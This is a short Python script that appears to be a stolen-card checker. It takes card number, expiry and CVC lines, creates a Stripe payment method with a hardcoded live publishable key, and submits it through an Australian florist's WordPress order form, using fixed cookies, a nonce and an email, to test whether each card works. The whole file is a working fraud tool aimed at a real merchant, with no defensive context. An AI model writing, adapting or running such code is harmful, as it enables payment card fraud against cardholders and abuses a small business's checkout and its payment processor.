import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51KquVnKLV2rxHZxolIJm4hF89QKkVuTOxe8RhxZvdUmLtUUEliBg3Ow1lY3UgpJB4ShiGn8IblrZ7bYsom1U18NZ00TdHt6KGl'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '42d73ad5-1ec7-45dc-b386-594f172ce4562db9af',
			'__stripe_sid': '441d87c3-778a-4fa1-ace6-376ff2c058304640b9',
	}

	headers = {
			'authority': 'flowersofbethlehem.com.au',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid': '42d73ad5-1ec7-45dc-b386-594f172ce4562db9af; __stripe_sid': '441d87c3-778a-4fa1-ace6-376ff2c058304640b9',
			'origin': 'https://flowersofbethlehem.com.au',
			'referer': 'https://flowersofbethlehem.com.au/order-page/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1729249681632',
	}

	data = {
			'data': '__fluent_form_embded_post_id=4295&_fluentform_5_fluentformnonce=86dae2bc93&_wp_http_referer=%2Forder-page%2F&email=banacolaa%40gmail.com&input_text=3124663122&description_2=Hello&description=24&description_3=Y&payment_input_2%5B%5D=Box+21%3A+Gerberas+%2C+%2430.00+each+box+shop+pickup+only+price&payment_method=stripe&payment_input_4%5B%5D=&payment_input%5B%5D=&payment_input_6%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '5',
	}
	
	r2 = requests.post(
			'https://flowersofbethlehem.com.au/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())
